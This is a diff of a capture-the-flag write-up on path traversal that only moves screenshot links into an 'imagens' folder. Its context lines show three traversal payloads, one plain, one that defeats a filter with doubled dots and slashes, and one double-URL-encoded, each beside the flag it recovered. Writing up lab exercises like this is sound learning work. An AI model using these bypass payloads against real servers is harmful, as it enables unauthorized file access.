@@ -17,7 +17,7 @@ Here there was no filter, just perform the path traversal.
 ../private/flag.txt
 ```
 
-![](2025-05-24_15-29.png)
+![](imagens/2025-05-24_15-29.png)
 
 ```json
 flag{D1R_TR4V3RS4L_F1L3_4CC3SS}
@@ -40,7 +40,7 @@ Here it was enough to duplicate the slashes to bypass the filter.
 ....//private//flag.txt
 ```
 
-![](2025-05-24_15-31.png)
+![](imagens/2025-05-24_15-31.png)
 
 ```json
 flag{F1LT3R_BYP4SS_D0T_D0T_SL4SH}
@@ -63,7 +63,7 @@ To bypass the filter here, it was necessary to double URL encode.
 %252E%252E%252Fprivate%252Fflag%252Etxt
 ```
 
-![](2025-05-24_15-33_1.png)
+![](imagens/2025-05-24_15-33_1.png)
 
 ```json
 flag{D0UBL3_3NC0D1NG_TR4V3R54L_M45T3R}
